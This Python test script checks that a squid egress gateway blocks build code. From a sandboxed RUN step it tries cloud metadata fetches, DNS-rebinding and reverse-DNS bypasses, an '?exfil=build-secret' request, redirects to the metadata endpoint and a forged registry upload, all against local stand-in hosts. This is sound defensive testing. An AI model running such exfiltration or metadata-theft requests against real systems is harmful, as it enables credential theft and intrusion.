#!/usr/bin/env python3
#
# Skald - Copyright (C) 2026 Gard Kroken
# SPDX-License-Identifier: Apache-2.0
#

"""The egress deny matrix, from a RUN step, through squid (t5-e5e3071-F6, part 4).

Q3's rule is deny all, allow only the configured repository hosts. T3 proved it for
tinyproxy with a container standing in for the worker (dev/egress-probe.py); the gateway is
now squid (T3(b)), and the gate found squid's deny matrix exercised by two requests. Here
every attempt is made by build code inside a real RUN step, under the shipping worker,
through the gateway the probes ship (dev/egress_gateway.py).

The matrix, each row judged on what squid itself answered -- a refusal must be squid's
403 with X-Squid-Error ERR_ACCESS_DENIED, i.e. POLICY, not a host that happened to be down:
  control   an allowlisted repository is fetched (without it every denial is meaningless)
  unlisted  a host not on the allowlist, by name and by IP literal
  private   an RFC 1918 IP literal
  metadata  169.254.169.254, by IP literal, and ALLOWLISTED names that resolve to it, to
            AWS's IPv6 endpoint and to Alibaba's (rebinding, or an operator's DNS)
  port      an allowlisted repository on a port that is not a repository port
  private   a PUBLIC repository name that resolves to a private address (DNS rebinding,
            or a public name pointed inward) is refused, while a host the operator DECLARED
            a private mirror is fetched (the control)
  PTR       an IP literal whose REVERSE DNS names an allowlisted repository, and one whose
            PTR names the registry (gate finding t5-f4f5f32-F1): the gateway resolves
            through a resolver this probe controls, standing in for the internet's DNS,
            where whoever owns an address sets its PTR. A control checks the resolver
            really serves both PTRs, or the rows would pass for the reason the original
            "by IP" row did -- the test addresses had no PTR at all.
  suffix    a name that extends an allowlisted one (allowed-repo.evil)
  redirect  an allowed repository redirecting to an unlisted host and to the metadata
            endpoint: the client follows, and the second hop must be refused; a redirect
            within the allowed host is followed (the control that redirects are followed)
  CONNECT   to an allowed host on 443 (control), to an unlisted host, and to a non-443 port
  bypass    a direct socket to the allowed repository, and to the internet, not through
            the gateway -- with the same tool reaching the gateway as the control
  DNS       an external name does not resolve from the RUN (no DNS channel out)
  registry  reachable through the gateway (it answers), and a write is refused (401)

--self-test restarts the gateway with one rule removed at a time (and once puts the worker
on the routable network) and requires the matching row to go red.

Usage: python3 dev/run-egress-probe.py [--json] [--self-test]
"""

import json
import os
import pathlib
import shutil
import sys
import tempfile

import run_attack_harness as h
import shipping_worker as sw

# The runtime this probe measures, read statically by dev/schema-fixture-check.py: a
# runtime's proofs in spec/isolation-profile-v1.json may cite only probes that measure THAT
# runtime (gate finding t5-f4f5f32-F2).
MEASURES_RUNTIME = "runc-rootless"

docker = h.docker
results = []

ALLOWED, DENIED, SUFFIX, REBIND = ("allowed-repo", "denied-host", "allowed-repo.evil",
                                   "rebind-repo")
METADATA = "169.254.169.254"
# Allowlisted names the gateway's resolver points at each kind of metadata address: the
# link-local one most clouds use, and the two outside link-local (b3d129f-F2).
REBINDS = {REBIND: METADATA, "rebind-aws6": "fd00:ec2::254",
           "rebind-alibaba": "100.100.100.200",
           # IPv6 link-local: refused by the metadata rule ALONE. The two above also sit in
           # private ranges (ULA, CGNAT), so the private-destination rule refuses them too and
           # removing the metadata rule no longer shows on their rows. With no route, squid
           # fails a connect here at once (503 ERR_CONNECT_FAIL), which is positive evidence
           # it tried; the IPv4 169.254 address only times out.
           "rebind-linklocal6": "fe80::1"}
# The operator's private mirror, declared as one, on the private network; and a PUBLIC
# repository name the gateway's resolver points at that mirror's private address.
MIRROR, REBIND_PRIVATE = "private-mirror", "rebind-private"
# Public names whose IPv6 address EMBEDS the mirror's private IPv4: NAT64 and 6to4
# (d8aaa14-F1). There is no translator here, so a policy that admitted them shows as squid
# trying (503 ERR_CONNECT_FAIL) and a policy that refuses them as ERR_ACCESS_DENIED.
REBIND_NAT64, REBIND_6TO4 = "rebind-nat64", "rebind-6to4"
PRIVATE_MIRRORS = [MIRROR]
REPOS = [ALLOWED, REBIND_PRIVATE, REBIND_NAT64, REBIND_6TO4] + sorted(REBINDS)


def _embedded(ipv4, prefix):
    """The IPv6 address that embeds `ipv4` under NAT64's 64:ff9b::/96 or 6to4's 2002::/16."""
    a, b, c, d = (int(x) for x in ipv4.split("."))
    v4 = "%02x%02x:%02x%02x" % (a, b, c, d)
    return "64:ff9b::%s" % v4 if prefix == "nat64" else "2002:%s::1" % v4
ADD_HOSTS = ["%s:%s" % (name, addr) for name, addr in sorted(REBINDS.items())]
HOSTS = {ALLOWED: "ALLOWED-CONTENT", DENIED: "DENIED-CONTENT", SUFFIX: "EVIL-CONTENT"}


def record(name, expectation, observed, ok, note=""):
    results.append({"name": name, "expectation": expectation, "observed": observed,
                    "ok": ok, "note": note})
    print("  %-6s %-40s %s" % ("ok" if ok else "FAIL", name, observed))
    if note:
        print("         %s" % note)


# ------------------------------------------------------------------ the servers

def _cgi(target):
    return ('#!/bin/sh\nprintf "Status: 302 Found\\r\\nLocation: %s\\r\\n\\r\\n"\n'
            % target)


def start_hosts(tmp):
    """One busybox httpd per name, on the outer network, on ports 80 and 443. The allowed
    host also serves three redirects. The files are written here and mounted read-only."""
    for name, content in HOSTS.items():
        www = pathlib.Path(tmp) / ("www-" + name)
        (www / "cgi-bin").mkdir(parents=True, exist_ok=True)
        (www / "index.html").write_text(content + "\n")
        if name == ALLOWED:
            (www / "ok.txt").write_text("ALLOWED-OK\n")
            for script, target in (("to-self", "http://%s/ok.txt" % ALLOWED),
                                   ("to-denied", "http://%s/" % DENIED),
                                   ("to-meta", "http://%s/latest/meta-data/" % METADATA)):
                path = www / "cgi-bin" / script
                path.write_text(_cgi(target))
                path.chmod(0o755)
        for p in [www, www / "cgi-bin"] + list(www.rglob("*")):
            os.chmod(p, 0o755 if p.is_dir() or p.parent.name == "cgi-bin" else 0o644)
        cname = "skald-egr-" + name.replace(".", "-")
        docker(["rm", "-f", cname])
        docker(["run", "-d", "--name", cname, "--network", h.OUTER, "--network-alias", name,
                "-v", "%s:/www:ro" % www, sw.BUSYBOX_IMAGE, "sh", "-c",
                "httpd -p 443 -h /www; exec httpd -f -p 80 -h /www"])


# Attacker-owned addresses whose PTR names an allowlisted host. Reached by IP literal only.
CANARIES = {"canary-repo": ("CANARY-REPO", "80", ALLOWED),
            "canary-registry": ("CANARY-REGISTRY", "5000", h.REGISTRY)}
RESOLVER, RESOLVER_IMAGE = "skald-egr-resolver", "skald-egr-resolver:local"


def start_mirror(tmp):
    """The operator's private mirror: on the private network only, reachable through the
    gateway, which is attached there. Returns its private address."""
    www = pathlib.Path(tmp) / "www-mirror"
    www.mkdir(parents=True, exist_ok=True)
    (www / "index.html").write_text("MIRROR-CONTENT\n")
    os.chmod(www, 0o755)
    os.chmod(www / "index.html", 0o644)
    docker(["rm", "-f", "skald-egr-mirror"])
    docker(["run", "-d", "--name", "skald-egr-mirror", "--network", h.PRIVATE,
            "--network-alias", MIRROR, "-v", "%s:/www:ro" % www, sw.BUSYBOX_IMAGE,
            "sh", "-c", "exec httpd -f -p 80 -h /www"])
    return docker(["inspect", "-f",
                   "{{(index .NetworkSettings.Networks \"%s\").IPAddress}}" % h.PRIVATE,
                   "skald-egr-mirror"]).stdout.strip()


def start_canaries(tmp):
    for name, (content, port, _) in CANARIES.items():
        www = pathlib.Path(tmp) / ("www-" + name)
        www.mkdir(parents=True, exist_ok=True)
        (www / "index.html").write_text(content + "\n")
        os.chmod(www, 0o755)
        os.chmod(www / "index.html", 0o644)
        cname = "skald-egr-" + name
        docker(["rm", "-f", cname])
        docker(["run", "-d", "--name", cname, "--network", h.OUTER,
                "-v", "%s:/www:ro" % www, sw.BUSYBOX_IMAGE, "sh", "-c",
                "httpd -p 443 -h /www; exec httpd -f -p %s -h /www" % port])


def start_resolver(tmp):
    """dnsmasq on the outer network: a PTR for each canary naming an allowlisted host, and
    everything else forwarded to Docker's embedded DNS, so every other name the gateway
    resolves is answered exactly as before. Returns its address."""
    d = pathlib.Path(tmp) / "resolver-image"
    d.mkdir(parents=True, exist_ok=True)
    (d / "Dockerfile").write_text("FROM alpine:3.20\nRUN apk add --no-cache dnsmasq\n")
    if docker(["build", "-q", "-t", RESOLVER_IMAGE, str(d)], timeout=900).returncode != 0:
        raise SystemExit("could not build the resolver image")
    ptrs = []
    for name, (_, _, points_at) in CANARIES.items():
        rev = ".".join(reversed(outer_ip(name).split("."))) + ".in-addr.arpa"
        ptrs.append("--ptr-record=%s,%s" % (rev, points_at))
    docker(["rm", "-f", RESOLVER])
    docker(["run", "-d", "--name", RESOLVER, "--network", h.OUTER, RESOLVER_IMAGE,
            "dnsmasq", "-k", "--no-resolv", "--no-hosts", "--server=127.0.0.11",
            "--log-queries", "--log-facility=-"] + ptrs)
    # Also on the private network, so Docker's DNS behind it answers for the private
    # mirror's name as the operator's resolver would; on the outer network alone the mirror
    # was ERR_DNS_FAIL (measured).
    docker(["network", "connect", h.PRIVATE, RESOLVER])
    return outer_ip("resolver")


def ptr_control():
    """(ok, detail): does the gateway's own resolver answer each canary's PTR with the
    allowlisted name? Asked from inside the gateway, through the resolver it uses."""
    seen = []
    for name, (_, _, points_at) in CANARIES.items():
        out = docker(["exec", h.GATEWAY, "nslookup", outer_ip(name)])
        seen.append((points_at in out.stdout, "%s -> %s" % (
            outer_ip(name), points_at if points_at in out.stdout else "NO PTR")))
    return all(ok for ok, _ in seen), "; ".join(d for _, d in seen)


def outer_ip(name):
    cname = "skald-egr-" + name.replace(".", "-")
    return docker(["inspect", "-f",
                   "{{(index .NetworkSettings.Networks \"%s\").IPAddress}}" % h.OUTER,
                   cname]).stdout.strip()


# ------------------------------------------------------------------ the attempts (shell)

MATRIX = r"""
P=http://%(gate_ip)s:8888
# Every network call is under `timeout`. Under the reverse_lookup weakening some request
# held a whole RUN past the harness's 900 s build timeout (measured), and busybox nc's -w
# bounds only connects and the final read, not a peer that keeps the connection open. A
# request cut off here reports first:none, which is never a pass.
# get KEY URL: fetch through the gateway as a raw HTTP/1.0 request over nc, so the whole
# response is seen -- busybox wget prints no headers for an error, and squid's
# X-Squid-Error header is what tells a POLICY refusal from a host that is merely down. A
# redirect is followed once, by hand, as a new request through the gateway (that is what a
# client does; squid, a forward proxy, never follows one itself).
raw() {
  h=${1#http://}; h=${h%%%%/*}
  # stdin held open: busybox nc drops the connection at stdin EOF, before a slower answer
  # arrives (measured: only squid's instant denials came back without this).
  { printf 'GET %%s HTTP/1.0\r\nHost: %%s\r\n\r\n' "$1" "$h"; sleep 3; } \
    | timeout 20 nc -w 10 %(gate_ip)s 8888 > /tmp/resp 2>/dev/null
  tr -d '\r' < /tmp/resp > /tmp/resp.n
  status=$(head -1 /tmp/resp.n | awk '{print $2}')
}
get() {
  raw "$2"; first=${status:-none}
  if [ "$first" = 302 ] || [ "$first" = 301 ]; then
    loc=$(awk 'tolower($1)=="location:"{print $2; exit}' /tmp/resp.n)
    raw "$loc"
  fi
  last=${status:-none}
  err=$(awk 'tolower($1)=="x-squid-error:"{print $2; exit}' /tmp/resp.n)
  body=$(sed '1,/^$/d' /tmp/resp.n | head -c 40 | tr -d '\n ')
  echo "$1=first:$first last:$last squid:${err:-none} body:${body:-none}"
  rm -f /tmp/resp /tmp/resp.n
}
# connect KEY HOST PORT: a raw CONNECT, the status line squid answers.
connect() {
  st=$( { printf 'CONNECT %%s:%%s HTTP/1.1\r\nHost: %%s:%%s\r\n\r\n' "$2" "$3" "$2" "$3";
          sleep 3; } | timeout 15 nc -w 5 %(gate_ip)s 8888 2>/dev/null | head -1 \
          | awk '{print $2}')
  echo "$1=${st:-none}"
}
# direct KEY HOST PORT: a socket opened by build code itself, not through the gateway.
direct() {
  if timeout 10 nc -z -w 5 "$2" "$3" 2>/dev/null; then echo "$1=CONNECTED"; else echo "$1=refused"; fi
}
get allowed http://%(allowed)s/
get unlisted http://%(denied)s/
get unlisted_ip http://%(denied_ip)s/
get private_ip http://10.255.255.1/
get metadata http://%(metadata)s/latest/meta-data/
get rebind http://%(rebind)s/
get rebind_aws6 http://rebind-aws6/
get rebind_alibaba http://rebind-alibaba/
get rebind_linklocal6 http://rebind-linklocal6/
get repo_badport http://%(allowed)s:6379/
get mirror http://%(mirror)s/
get rebind_private http://%(rebind_private)s/
get rebind_nat64 http://%(rebind_nat64)s/
get rebind_6to4 http://%(rebind_6to4)s/
get ptr_repo "http://%(canary_repo)s/?exfil=build-secret"
get ptr_registry http://%(canary_registry)s:5000/v2/
connect ptr_connect %(canary_repo)s 443
get suffix http://%(suffix)s/
get redirect_ok http://%(allowed)s/cgi-bin/to-self
get redirect_unlisted http://%(allowed)s/cgi-bin/to-denied
get redirect_meta http://%(allowed)s/cgi-bin/to-meta
connect connect_allowed %(allowed)s 443
connect connect_unlisted %(denied)s 443
# Port 80, not an arbitrary one: 80 is a repository port, so only the CONNECT-to-443 rule
# refuses this tunnel. Against port 22 the repository-port rule refused it as well, and a
# gateway without the CONNECT rule still passed (measured, b3d129f-F1 follow-up).
connect connect_badport %(allowed)s 80
direct direct_control %(gate_ip)s 8888
direct direct_repo %(allowed_ip)s 80
direct direct_internet 1.1.1.1 53
# The resolver the RUN is given lists public servers (Docker copies the host's), so a
# failure here is the internal network's missing route, which direct_internet shows too.
# The control is that the tool exists: an absent applet must not read as "no DNS".
echo "dns_tool=$(command -v nslookup >/dev/null 2>&1 && echo yes || echo no)"
if timeout 15 nslookup example.com >/dev/null 2>&1; then echo "dns=resolved"; else echo "dns=failed"; fi
echo "dns_servers=$(awk '/^nameserver/{printf "%%s,", $2}' /etc/resolv.conf 2>/dev/null)"
get registry_read http://%(registry)s:5000/v2/
http_proxy=$P wget -S -T 10 -O /dev/null --post-data=x \
  http://%(registry)s:5000/v2/probe-forged/blobs/uploads/ > /tmp/w 2>&1
echo "registry_write=$(awk '/^ *HTTP\//{print $2; exit}' /tmp/w)"
"""


# ------------------------------------------------------------------ judges (pure)

def parse(report):
    out = {}
    for line in report:
        if "=" in line:
            k, v = line.split("=", 1)
            out[k.strip()] = v.strip()
    return out


def fields(value):
    """'first:200 last:200 ...' -> dict."""
    return dict(p.split(":", 1) for p in value.split() if ":" in p)


def fetched(r, key, content):
    f = fields(r.get(key, ""))
    return f.get("last") == "200" and f.get("body") == content


def policy_denied(r, key, forbidden_content=None):
    """squid's own refusal: 403 with ERR_ACCESS_DENIED, and none of the target's content."""
    f = fields(r.get(key, ""))
    denied = f.get("last") == "403" and f.get("squid") == "ERR_ACCESS_DENIED"
    leaked = forbidden_content is not None and f.get("body") == forbidden_content
    return denied and not leaked


def judge(report, ptr_ok=True):
    """Row name -> (ok, detail). Every row is judged even if the control failed, but a
    failed control makes every denial row inconclusive, and inconclusive is not ok."""
    r = parse(report)
    rows = {}
    control = fetched(r, "allowed", "ALLOWED-CONTENT")

    def row(name, ok, *keys):
        detail = "; ".join("%s=%s" % (k, r.get(k, "missing")) for k in keys)
        if not control:
            detail += "  <- inconclusive: the allowed repository was not fetched"
        rows[name] = (ok and control, detail)

    rows["allowed repository fetched (control)"] = (
        control, "allowed=%s" % r.get("allowed", "missing"))
    row("unlisted host refused by squid", policy_denied(r, "unlisted", "DENIED-CONTENT"),
        "unlisted")
    row("unlisted host refused by IP", policy_denied(r, "unlisted_ip", "DENIED-CONTENT"),
        "unlisted_ip")
    row("private IP literal refused", policy_denied(r, "private_ip"), "private_ip")
    row("metadata endpoint refused", policy_denied(r, "metadata"), "metadata")
    row("allowlisted name resolving to metadata refused", policy_denied(r, "rebind"),
        "rebind")
    row("allowlisted name resolving to AWS IPv6 metadata refused",
        policy_denied(r, "rebind_aws6"), "rebind_aws6")
    row("allowlisted name resolving to Alibaba metadata refused",
        policy_denied(r, "rebind_alibaba"), "rebind_alibaba")
    row("allowlisted name resolving to an IPv6 link-local address refused",
        policy_denied(r, "rebind_linklocal6"), "rebind_linklocal6")
    row("allowlisted repository on another port refused", policy_denied(r, "repo_badport"),
        "repo_badport")
    row("a declared private mirror is fetched (control)",
        fetched(r, "mirror", "MIRROR-CONTENT"), "mirror")
    row("public repository name resolving to a private address refused",
        policy_denied(r, "rebind_private", "MIRROR-CONTENT"), "rebind_private")
    row("public repository name resolving to NAT64-embedded private IPv4 refused",
        policy_denied(r, "rebind_nat64"), "rebind_nat64")
    row("public repository name resolving to 6to4-embedded private IPv4 refused",
        policy_denied(r, "rebind_6to4"), "rebind_6to4")
    # Gated on the resolver control as well: without a PTR to follow, a refusal here proves
    # nothing about reverse lookups (t5-f4f5f32-F1).
    for key, label, ok in (
            ("ptr_repo", "IP literal whose PTR names a repository refused",
             policy_denied(r, "ptr_repo", "CANARY-REPO")),
            ("ptr_registry", "IP literal whose PTR names the registry refused",
             policy_denied(r, "ptr_registry", "CANARY-REGISTRY")),
            ("ptr_connect", "CONNECT to an IP whose PTR names a repository refused",
             r.get("ptr_connect") == "403")):
        row(label, ok and ptr_ok, key)
        if not ptr_ok:
            rows[label] = (False, rows[label][1] + "  <- inconclusive: the resolver did "
                                                   "not serve the PTR")
    row("suffix of an allowed name refused", policy_denied(r, "suffix", "EVIL-CONTENT"),
        "suffix")
    redirect_ok = (fields(r.get("redirect_ok", "")).get("first") == "302"
                   and fetched(r, "redirect_ok", "ALLOWED-OK"))
    row("a redirect within the allowed host is followed (control)", redirect_ok,
        "redirect_ok")
    for key, label, content in (
            ("redirect_unlisted", "redirect to an unlisted host refused", "DENIED-CONTENT"),
            ("redirect_meta", "redirect to the metadata endpoint refused", None)):
        ok = (redirect_ok and fields(r.get(key, "")).get("first") == "302"
              and policy_denied(r, key, content))
        row(label, ok, key)
    connect_ok = r.get("connect_allowed") == "200"
    row("CONNECT to an allowed host on 443 (control)", connect_ok, "connect_allowed")
    row("CONNECT to an unlisted host refused",
        connect_ok and r.get("connect_unlisted") == "403", "connect_unlisted")
    row("CONNECT to a non-443 port refused",
        connect_ok and r.get("connect_badport") == "403", "connect_badport")
    direct_control = r.get("direct_control") == "CONNECTED"
    row("no direct socket to the repository",
        direct_control and r.get("direct_repo") == "refused", "direct_control", "direct_repo")
    row("no direct socket off the host",
        direct_control and r.get("direct_internet") == "refused", "direct_control",
        "direct_internet")
    row("no DNS resolution of an external name",
        r.get("dns_tool") == "yes" and r.get("dns") == "failed", "dns_tool", "dns",
        "dns_servers")
    reg = fields(r.get("registry_read", ""))
    row("registry reachable, reads need a credential",
        reg.get("last") == "401" and reg.get("squid") == "none", "registry_read")
    row("registry write refused", r.get("registry_write") in ("401", "403"),
        "registry_write")
    return rows


# ------------------------------------------------------------------ the run

def run_matrix(tmp, label):
    script = MATRIX % {
        "gate_ip": h.gateway_ip_on_inner(), "allowed": ALLOWED, "denied": DENIED,
        "suffix": SUFFIX, "rebind": REBIND, "metadata": METADATA, "registry": h.REGISTRY,
        "denied_ip": outer_ip(DENIED), "allowed_ip": outer_ip(ALLOWED),
        "canary_repo": outer_ip("canary-repo"),
        "canary_registry": outer_ip("canary-registry"),
        "mirror": MIRROR, "rebind_private": REBIND_PRIVATE,
        "rebind_nat64": REBIND_NAT64, "rebind_6to4": REBIND_6TO4}
    ptr_ok, ptr_detail = ptr_control()
    report, blob = h.run_local_step(tmp, "egress-" + label, script)
    lines = [l.strip() for l in report.strip().splitlines() if l.strip()]
    if not lines:
        return None, blob
    state["report"], state["ptr_ok"] = parse(lines), ptr_ok
    rows = judge(lines, ptr_ok)
    rows["the gateway's resolver serves the canaries' PTRs (control)"] = (ptr_ok, ptr_detail)
    return rows, blob


def shipped_gateway(weaken=None, repos=None):
    h.start_gateway(repos=REPOS if repos is None else repos, weaken=weaken,
                    add_hosts=ADD_HOSTS + [
                        "%s:%s" % (REBIND_PRIVATE, state["mirror_ip"]),
                        "%s:%s" % (REBIND_NAT64, _embedded(state["mirror_ip"], "nat64")),
                        "%s:%s" % (REBIND_6TO4, _embedded(state["mirror_ip"], "6to4"))],
                    resolver=state["resolver"], private_mirrors=PRIVATE_MIRRORS)


state = {"resolver": None, "report": {}, "ptr_ok": False, "mirror_ip": None}


def main(argv):
    print("== the egress deny matrix, from a RUN step, through squid ==")
    print()
    tmp = tempfile.mkdtemp(prefix="skald-egress-run-")
    try:
        h.setup(tmp)
        start_hosts(tmp)
        start_canaries(tmp)
        state["mirror_ip"] = start_mirror(tmp)
        state["resolver"] = start_resolver(tmp)
        shipped_gateway()
        if "--self-test" in argv:
            return self_test(tmp)
        rows, blob = run_matrix(tmp, "shipped")
        if rows is None:
            record("the matrix ran", "a RUN step reported", "no report: %s"
                   % blob.strip()[-200:], False)
        else:
            for name, (ok, detail) in rows.items():
                record(name, "", detail, ok)
    finally:
        h.teardown()
        shutil.rmtree(tmp, ignore_errors=True)

    bad = [r for r in results if not r["ok"]]
    print()
    print("  %d row(s), %d failed" % (len(results), len(bad)))
    print()
    print("RESULT:", "build code reaches only the configured repositories and the registry"
          if not bad else "%d egress row(s) FAILED" % len(bad))
    if "--json" in argv:
        print(json.dumps(results, indent=2))
    return 0 if not bad else 1


# Each weakening, and the rows it must turn red. Every red row is printed too, so a
# weakening that turns a row red only by collateral is visible in the log.
def _squid_tag(r, key):
    return fields(r.get(key, "")).get("squid")


# Each weakening: its rows that must turn red, and the POSITIVE EVIDENCE that the hole its
# rule closes was actually used. A row is red for many reasons -- a failed control, a dead
# resolver, a request cut off by `timeout` -- and accepting "red" alone let a weakening
# read as caught without the bypass ever being shown (90a889d review N1). The evidence is
# judged on the raw report, so it names WHICH branch made the row red. Every red row is
# printed too, so collateral is visible in the log.
WEAKENINGS = [
    ("the unlisted host allowlisted", dict(repos=REPOS + [DENIED]),
     ["unlisted host refused by squid", "redirect to an unlisted host refused",
      "CONNECT to an unlisted host refused"],
     lambda r, ptr: fetched(r, "unlisted", "DENIED-CONTENT")),
    ("allow all before deny all", dict(weaken="allow_all"),
     ["unlisted host refused by squid", "unlisted host refused by IP",
      "private IP literal refused", "suffix of an allowed name refused"],
     lambda r, ptr: (fetched(r, "unlisted_ip", "DENIED-CONTENT")
                     and fetched(r, "suffix", "EVIL-CONTENT"))),
    # Only link-local is this rule's alone: AWS's IPv6 and Alibaba's metadata addresses are
    # in private ranges and stay refused without it (measured, 2026-10-02). The evidence that
    # squid TRIED is the IPv6 link-local row: no route, so it fails the connect at once and
    # says so (503 ERR_CONNECT_FAIL). The IPv4 169.254 row only times out, and a timeout
    # alone is evidence of nothing (0b57894 review N1). Neither may be refused by policy.
    ("no metadata deny", dict(weaken="no_metadata_deny"),
     ["allowlisted name resolving to metadata refused",
      "allowlisted name resolving to an IPv6 link-local address refused"],
     lambda r, ptr: (_squid_tag(r, "rebind_linklocal6") == "ERR_CONNECT_FAIL"
                     and _squid_tag(r, "rebind") != "ERR_ACCESS_DENIED")),
    ("no private-destination deny", dict(weaken="no_private_deny"),
     ["public repository name resolving to a private address refused"],
     lambda r, ptr: fetched(r, "rebind_private", "MIRROR-CONTENT")),
    # No translator here: without the prefixes squid admits the request and fails the
    # connect, and says so -- the evidence that policy let it through (d8aaa14-F1).
    ("no NAT64/6to4 deny", dict(weaken="no_embedded_ipv4_deny"),
     ["public repository name resolving to NAT64-embedded private IPv4 refused",
      "public repository name resolving to 6to4-embedded private IPv4 refused"],
     lambda r, ptr: (_squid_tag(r, "rebind_nat64") == "ERR_CONNECT_FAIL"
                     and _squid_tag(r, "rebind_6to4") == "ERR_CONNECT_FAIL")),
    ("repositories on any port", dict(weaken="any_repo_port"),
     ["allowlisted repository on another port refused"],
     lambda r, ptr: _squid_tag(r, "repo_badport") == "ERR_CONNECT_FAIL"),
    ("reverse lookups (dstdomain without -n)", dict(weaken="reverse_lookup"),
     ["IP literal whose PTR names a repository refused",
      "IP literal whose PTR names the registry refused",
      "CONNECT to an IP whose PTR names a repository refused"],
     lambda r, ptr: (ptr and fetched(r, "ptr_repo", "CANARY-REPO")
                     and r.get("ptr_connect") == "200")),
    ("the allowlist unanchored", dict(weaken="unanchored"),
     ["suffix of an allowed name refused"],
     lambda r, ptr: fetched(r, "suffix", "EVIL-CONTENT")),
    ("CONNECT to any port", dict(weaken="any_connect_port"),
     ["CONNECT to a non-443 port refused"],
     lambda r, ptr: r.get("connect_badport") == "200"),
    ("the allowlist emptied", dict(repos=[]),
     ["allowed repository fetched (control)"],
     lambda r, ptr: _squid_tag(r, "allowed") == "ERR_ACCESS_DENIED"),
]


def self_test(tmp):
    print("== self-test: each row must go red when its rule is removed ==")
    missed = []

    # Offline: a failed control makes the denials inconclusive, not green.
    rows = judge(["allowed=first:403 last:403 squid:ERR_ACCESS_DENIED body:none",
                  "unlisted=first:403 last:403 squid:ERR_ACCESS_DENIED body:none"])
    if rows["unlisted host refused by squid"][0]:
        print("  FAIL a denial passed with the control failed")
        missed.append("control gating")
    else:
        print("  ok   a denial with a failed control is inconclusive")
    rows = judge(["allowed=first:200 last:200 squid:none body:ALLOWED-CONTENT",
                  "unlisted=first:503 last:503 squid:ERR_CONNECT_FAIL body:none"])
    if rows["unlisted host refused by squid"][0]:
        print("  FAIL a connect failure was taken for a policy refusal")
        missed.append("policy vs reachability")
    else:
        print("  ok   an unreachable host is not a policy refusal")
    rows = judge(["allowed=first:200 last:200 squid:none body:ALLOWED-CONTENT",
                  "dns_tool=no", "dns=failed"])
    if rows["no DNS resolution of an external name"][0]:
        print("  FAIL a missing nslookup was taken for no DNS")
        missed.append("dns control")
    else:
        print("  ok   a missing DNS tool is inconclusive, not a pass")

    # Offline: no weakening's evidence may be satisfied by a run in which every request
    # timed out and the resolver control failed -- the run that turns every row red for
    # the wrong reason (90a889d review N1).
    dead = {k: "first:none last:none squid:none body:none" for k in (
        "allowed", "unlisted", "unlisted_ip", "private_ip", "rebind", "rebind_aws6",
        "rebind_alibaba", "rebind_linklocal6", "repo_badport", "suffix", "ptr_repo", "ptr_registry", "mirror",
        "rebind_private", "rebind_nat64", "rebind_6to4")}
    dead.update(connect_badport="none", ptr_connect="none", direct_repo="refused")
    satisfied = [label for label, _, _, evidence in WEAKENINGS if evidence(dead, False)]
    if satisfied:
        print("  FAIL evidence satisfied by a dead run: %s" % ", ".join(satisfied))
        missed.append("evidence on a dead run")
    else:
        print("  ok   no weakening's evidence is satisfied by a run where nothing answered")

    for label, kw, must_fail, evidence in WEAKENINGS:
        weaken = kw.get("weaken")
        repos = kw.get("repos", REPOS)
        shipped_gateway(weaken=weaken, repos=repos)
        rows, blob = run_matrix(tmp, label.replace(" ", "-"))
        if rows is None:
            print("  FAIL %s: no report: %s" % (label, blob.strip()[-120:]))
            missed.append(label)
            continue
        all_red = sorted(n for n, (ok, _) in rows.items() if not ok)
        print("       (red under this weakening: %s)" % "; ".join(all_red))
        reds = [n for n in must_fail if rows[n][0]]
        if reds:
            print("  FAIL %s: NOT caught by %s" % (label, ", ".join(reds)))
            missed.append(label)
        elif not evidence(state["report"], state["ptr_ok"]):
            print("  FAIL %s: its rows are red, but not because the hole was used -- no "
                  "positive evidence in the report" % label)
            missed.append(label)
        else:
            print("  ok   %s -- red: %s" % (label, "; ".join(
                "%s (%s)" % (n, rows[n][1][:70]) for n in must_fail)))

    # The worker on the routable network: the bypass rows must go red.
    shipped_gateway()
    docker(["network", "connect", h.OUTER, h.WORKER])
    rows, blob = run_matrix(tmp, "routable")
    docker(["network", "disconnect", h.OUTER, h.WORKER])
    if (rows is None or rows["no direct socket to the repository"][0]
            or state["report"].get("direct_repo") != "CONNECTED"):
        print("  FAIL the worker on the routable network: direct socket NOT caught (%s)"
              % (rows["no direct socket to the repository"][1] if rows
                 else blob.strip()[-120:]))
        missed.append("routable worker")
    else:
        print("  ok   the worker on the routable network -- red: %s"
              % rows["no direct socket to the repository"][1][:90])

    print()
    if missed:
        print("RESULT: self-test FAILED: %s" % ", ".join(missed))
        return 1
    print("RESULT: self-test passed -- every row goes red when its rule is removed")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
